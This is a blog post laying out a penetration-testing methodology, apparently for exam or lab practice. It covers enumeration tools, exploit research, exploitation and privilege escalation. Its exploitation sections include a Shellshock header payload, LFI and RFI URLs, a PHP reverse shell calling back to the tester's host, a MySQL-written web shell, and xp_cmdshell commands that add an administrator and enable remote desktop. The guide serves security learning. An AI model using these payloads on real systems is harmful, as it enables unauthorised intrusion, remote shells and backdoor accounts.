---
layout: post
title: "Penetration Testing Process"
categories: guides_docs
excerpt: A general strategy guideline for pentesting
comments: false
share: true
tags: [hacking, pentesting, guide]
image:
  feature:
date: 2017-07-17
---
The following is a general guideline for how I would start to attack a machine.  I broke it down into enumeration, doing research on what I found, exploitation (either getting root or a low privilege), then attempting low-priv escalation.

> NOTE: These are generic guidelines where I have left out anything that is related to Offensive Security's lab. Still, the following may be helpful if you're not sure where to start or what to start using to make some progress. Hope it's helpful for somebody.

# Enumeration
---
## Network Enumeration
Network Port Scan - Utilize OneTwoPunch or NMAP to identify any running services on the remote system. Both will default to the 1,000 most popular ports. If you don't find anything, try a full scan of all 65535 ports.

Create a text file with the IP to be scanned:
``` bash
root@kali:~# echo 192.168.1.100 > target.txt
```

Run onetwopunch.sh against the target to identify open TCP and UDP ports:
~/onetwopunch.sh -t target.txt -i eth0  (Runs the scan on eth0 against the targets TCP ports.)
~/onetwopunch.sh -t target.txt -i eth0 -p udp -n -A (Runs the scan on eth0 against the UDP ports and executes the -A flag when running NMAP.)
~/onetwopunch.sh -t target.txt -i eth0 -n "-A -sV" (Runs the scan with both the -A and -sV flags set for nmap.)

### Wireshark
Wireshark is a network sniffer that collects network traffic and breaks it out into a human readable format. It is very good at showing communications between systems and provides insight into what a system is sending. It can be used to identify windows traffic, sniff for passwords, look for hidden shares and to listen for responses to exploits you are executing over the network. Sometimes an exploit is trying to do something different than you think and it can be helpful to see all of the network traffic to clearly see what communications are going on between your system and the target's. I find it helpful to have Wireshark running at all times during a pen test so I can review the packets as needed.

### Port Knocking
Something to be aware of is that some systems have ports that will only become open after a port knocking sequence. This is something that you may be clued into for a system (particularly for CTF machines) but this is also a legitimate technique to hide ports in production systems as well. If you have an idea of what three ports may unlock other ports you can use the following nmap command to initiate the sequence. NOTE: After running this you should perform a full port scan again to see if any ports opened up (they can be odd ports so a top-ports scan is not advised).

Port knocking with nmap: knocks ports 1, 2, 3
``` bash
root@kali:~# nmap 10.10.1.104 -Pn -sS -p 1-3
root@kali:~# nmap 10.10.1.104 -p-
```

An additional tool that I use most often for port knocking is knock-knock which is a python script that can be found below.
```
https://github.com/pan0pt1c0n/knock-knock
```

## DNS Enumeration
Enumeration of the host names used by systems can help to define and identify the types of servers on a corporate network. If zone transfers are not properly secured, you can pull the entire list of servers by IP and hostname greatly improving the enumeration of a network.

The 'host' command is used to query DNS from linux.
``` bash
root@kali:~# host -l <domain-name-here> (request a zone transfer from the <domain-name-here> domain)
```

## Web Enumeration
Use tools to test for vulnerabilities on found web ports. Tools such as nikto, curl, gobuster, dirbuster, and burpsuite can all be used to enumerate any web server vulnerabilities, running software such as PHP, perl, and python, unlinked directories that can be accessed directly and any files within them, documents such as readme that will provide version information etc.

### Nikto
Nikto will crawl the webserver looking for known directories and testing for vulnerable settings and software. It can take quite some time but will provide a good idea of places to start testing.
``` bash
root@kali:~# nikto -host 192.168.1.100
```

### Gobuster and Dirbuster
Gobuster and dirbuster are directory and file enumeration tools that use a list of file/directory names to brute force test whether they exist on a target system. Both can be used with BurpSuite as their proxy so that the content tested is collected and easily reviewed and tested against. I would recommend always using BurpSuite as the proxy for these tools. Gobuster will be explained here but dirbuster is very similar. Gobuster is better at pinpoint testing against each directory where dirbuster can be used to try to run as many different combinations as possible. I find gobuster more methodical.

Run gobuster against a directory with a provided wordlist, found in the Kali Linux installation and use the local BurpSuite application as a web proxy:
``` bash
root@kali:~# gobuster -u http://192.168.1.100/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -p http://127.0.0.1:8080
```

### Curl
Curl is a command line tool to query web servers and other network ports. It is very useful for identifying versions through banner grabs (such as with FTP) as well as parsing web pages into a text readable and command line tool manipulable format. It can also be used to automate attacks that use a URL insertion to simplify actions and make them more repeatable.

Look at the Page Header and What is being Sent:
``` bash
root@kali:~# curl -v http://192.168.1.100/cgi-bin/admin.cgi -s >/dev/null
```

Test is you can execute a bash script from a header field:
``` bash
root@kali:~# curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; uname -a; echo zzzz;'"  http://192.168.1.100/cgi-bin/admin.cgi
```

Query a webpage and output it to HTML2Text:
``` bash
root@kali:~# curl -vk https://192.168.1.100 | html2text
```

Enumerate HTTP methods with curl:
``` bash
root@kali:~# curl -vX OPTIONS 192.168.1.100/test
```

Quick test with curl of PUT option:
``` bash
root@kali:~# curl -vX PUT -d "$(cat test.txt)" 192.168.1.100/test/test.txt
```

### LFI/RFI Discovery
You can potentially detect if there are possible LFI's or RFI's via the "fimap" python script.
``` bash
root@kali:~# fimap.py -u 'http://192.168.1.100/test.php?file=bang&id=23'
```

## WordPress Enumeration
WordPress is commonly used for website presentation through themes. It's multitude of plugins offer myriad avenues of potential vulnerabilities. Wpscan is a great tool to identify them.

### wpscan
Wpscan identifies the WordPress version and plugins installed and compares them against a list of known vulnerabilities which it lists out. It also provides the name of the current theme.

Check WordPress and its plugins for vulnerabilities:
``` bash
root@kali:~# wpscan --url 192.168.1.100 --enumerate p
```

## Windows and Samba Enumeration
Enumeration of windows and samba systems can provide lists of running services, known users, file shares, open network ports and more. If UDP port 135/137 are available, you are likely able to enumerate some items on the target.

### Enum4Linux
Enum4Linux (e4l) is a perl program that wraps several Samba tools into one. It uses smbclient, rpclient, net and nmblookup to pull as much information from the target as possible.

Run all checks against the target:
``` bash
root@kali:~# enum4linux 192.168.1.100
```

### SMB Client
SMB Client is a Samba tool used for connecting to remote systems. It can be used to enumerate shares and to connect to them. It is used by e4l to do this very thing. If you find a share you wish to connect with however, you will need to use smbclient directly.

List the network shares on the target:
``` bash
root@kali:~# smbclient -L 192.168.1.100
```

Connect to the wwwroot share:
``` bash
root@kali:~# smbclient \\\\192.168.1.100\\wwwroot
```

## SNMP Enumeration
SNMP tools provide information such as running processes, devices installed, memory information, user accounts, and much more. If SNMP is running it can greatly improve the amount of information known about a system. Snmp-check and snmpwalk are tools that can collect this information.

### snmp-check
Snmp-check gives a great human readable report on the SNMP information available.

Enumarate the SNMP information on target:
``` bash
root@kali:~# snmp-check 192.168.1.100
```

### snmpwalk
Snmpwalk is a less visually friendly command that can enumerate SNMP available information. It can be used to query specific SNMP strings however and is handy in that regard.

Enumerate SNMP information on target:
``` bash
root@kali:~# snmpwalk -c public -v1 192.168.1.100
```

## Miscellaneous Enumeration
Some tools can be used to query ports and services in different ways in order to glean more information from them. Netcat and nmap are both capable of running against targets to pull out banners and other information in order to identify the application and its version.

### netcat (nc)
Netcat is the swiss army tool of network communication. It can be used to setup listeners, connect to ports, transfer files, initiate remote command lines and more. For enumeration, it is often used to connect to an open port and pull any information it receives, often from the banner.

Query a web server on port 9000:
``` bash
root@kali:~# nc 192.168.1.100 9000
```

### nmap
Nmap is the king of network scanners and has many different functions it can perform including running scripts and shells. It is very good at enumerating ports and is used by the OneTwoPunch (12p) script mentioned above.

Scan the top 1000 TCP ports and then attempt to determine the applications and versions running on open ports:
``` bash
root@kali:~# nmap 192.168.1.100 -A
```

### HTML Source
I try to view the page source for most home pages and custom web pages looking for comments or version information. It is good practice to check source all the time to help enumerate the website. You can also find hidden form fields and other information as well that can help you to understand how the site operates.

---
# Research
## Vulnerability Research Tools
### Searchsploit
Searchsploit is a command line tool that checks the exploit-db database for known vulnerabilities with exploits. It is downloaded to the local system so all of the exploits are available. It can be updated regularly to ensure you have the latest exploits from the exploit-db.com database.

Search for a known exploit for vsftpd.
``` bash
root@kali:~# searchsploit vsftpd
```

### Web
### Google
This is pretty obvious but worth mentioning, Google will likely bring up the following sites that are explained when searching for exploits but it's also good to remember that you can refine its searches and it can be used to find weird looking bits of code etc. to help identify what app version you are seeing or to better enumerate what is going on with the target system. Don't be afraid to search on even the most benign looking bit of text as it could be very specific to a certain application.

### CVEdetails.com
This site provides a list of known vulnerabilities and exploits that can be refined as desired. It shows a score relating to the risk of the item and can be handy in a quick review of vulnerabilities for an application. It can also provide details on what the vuln is and what is needed to exploit it.

### Exploit-db.com
This is the web site that provides the same information that searchsploit provides, plus things like raw code for the exploit as well as the ability to download the vulnerable version of the software, which can be very helpful in testing. The website requires a captcha to search from it's main screen but if you search from Google and use site:exploit-db.com you can get to most pages directly. This is one of my favorites.

### Securityfocus.com
This site is kind of a general mixture of CVE and ExDB. It has writeups on vulns and links to exploits. I like it primarily because it may have additional exploits that are not found or easily identified by the others. Specifically I've had luck finding a python version of an exploit that was only in ruby or C. This makes it much easier to run.

---
# Exploitation
## SQL Injection
SQL Injection is the usage of SQL specific commands and special characters in input fields in order to break the current SQL statement and to insert your own desired statement. It is used in many different ways and changes with the underlying DB OS.

A useful cheat sheet for injections can be found here: [https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

## Local File Inclusion
Local File Inclusion or LFI is the calling of a file on the target system in an unexpected manner. It is often done through URL manipulation such as directory traversal.

Example LFI Attack
```
https://192.168.1.100/index.php?page=../../../../../../../etc/passwd
```

## Remote File Inclusion
Remote File Inclusion or RFI is the calling of a remote file, usually from your local system, from the target system. This is often done through URL manipulation.

Example RFI Attack
```
https://192.168.1.100/index.php?page=http://192.168.1.101/shell.php%00 (where 192.168.1.101 is your machine IP)
```

This url calls a php file from the remote server, in this instance my attacking box, and executes the file locally to the target system. The %00 terminates the PHP.

The code inside of the file would look something like this:
```
<?php print shell_exec("/bin/bash -i >& /dev/tcp/192.168.1.101/443 0>&1");?>
```

It assigns a bash shell to a listener and then initiates a call to my local system on port 443. Running a netcat listener on 443 will accept the reverse shell and I will have a shell with the privileges of the user the web server is running as.

## Password Attacks
There are many forms of password attacks, hash cracking, password guessing, hash passing, it is important to understand how authentication systems operate to assist in circumventing or compromising them.

## Hash Cracking
There are several websites that have publicly available rainbow tables that will take a provided hash and compare. They can be very helpful in finding basic passwords quickly.

Two examples:<br />
[https://crackstation.net](https://crackstation.net)<br />
[https://hashkiller.co.uk](https://hashkiller.co.uk)

### Johnny or John the Ripper
Johnny is a password cracking program. It is a graphical version of John the Ripper. It can take a wordlist, hash it, then compare it against a list of hashes provided. It can take in files in /etc/passwd /etc/shadow format and identify which hash algorithm is in use. It is very powerful.

### Password Guessing
One of the quickest ways to compromise a system is to brute force a password. It is also important to try well known combinations, admin:admin, admin:password, and so on. It's also very helpful to find out what the default username and password is for an application to see if it has been changed or removed.

Brute force tools like Hydra are great for iterating through user and password lists against HTML, SSH, FTP, authentication to start. The command line can be tricky, especially with web authentication, but it is good to know how to use it.

### Custom Password Lists
Use Cewl and John the Ripper to create custom password lists from web sites and other input.

## Remote Code Execution
Remote code execution or RCE is when an attacker is able to run code on a remote system. It can be done through buffer overflow exploits, misconfigured web servers, badly coded applications, and is a very strong method of compromise when it exists.

### Shellshock or Bashbug
Shellshock takes advantage of an environment variable being passed from an application to the bash shell. Using a specific string to start the variable, () { :; }; , it stops being interpreted as a string and instead as a bash command. This allows the attacker to string along shell commands to be executed by the program.

https://blog.cloudflare.com/inside-shellshock/

## Anonymous FTP
Anonymous FTP can lead to different attack avenues. If the system has an additional vulnerability in FTP that requires being authenticated, such as a directory traversal attack, then it makes it that much simpler. If the FTP server is configured to allow access to certain directories, for instance the web root, you can upload bind and reverse shells to the web server then execute them through the browser.

## SMB Shares
SMB Shares that are public can be great avenues for attack. If the share is the web root or part of it, you can upload bind and reverse shells to the system to call from your browser. Tools like enum4linux can identify these shares and smbclient can be used to connect to it directly.

---
# Privilege Escalation
Operating systems have many different vectors for privilege escalation. Some are simple, some are complex, it is worth taking the time to understand how each works so you know what to look for.

## Windows Escalation
* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)<br />
* [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)<br />
* [Dumping Windows Credentials](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)<br />

## Linux Escalation
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)<br />
* [Rebootuser Linux Enumeration & Priv Esc](https://www.rebootuser.com/?p=1623)
* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)<br />
* [LinEnum](https://github.com/rebootuser/LinEnum)

## Database Attacks
If you are able to gain access to a database, there are several ways you can use it to your advantage:

### MySQL Example<br />
If you can connect to a remote MySQL server and get command line access via:
```
root@kali:~# mysql -u root -p -h 192.168.1.100
```

You may be able to output a file to disk via the MySQL command line (you can put the base64 payload (from msfvenom, for example) into a select):
```
mysql> select "<?PHP eval(base64_decode(<base64-value-here>)); ?>" INTO OUTFILE "../../www/html/shell.php";
Query OK, 1 row affected (0.00 sec)
```

### Microsoft SQL Server Example<br />
In the event of Microsoft SQL Server you may want to check whether you can use xp_cmdshell to execute commands. The following is just one example of how you may be able to create a user and enable remote desktop on a victim machine.

Connect to server via sqsh (need to setup configuration in ~/.sqshrc first)
``` bash
root@kali:~# sqsh -S 192.168.1.100
```

Attempt to enable it
``` sql
exec sp_configure 'show advanced options', 1
go
reconfigure
go
exec sp_configure 'xp_cmdshell', 1
go
reconfigure
go
```

Try to add user
``` sql
xp_cmdshell 'net user testuser password /add'
go
xp_cmdshell 'net localgroup Administrators testuser /add'
go
```

Try to enable remote desktop
``` sql
xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
go
```
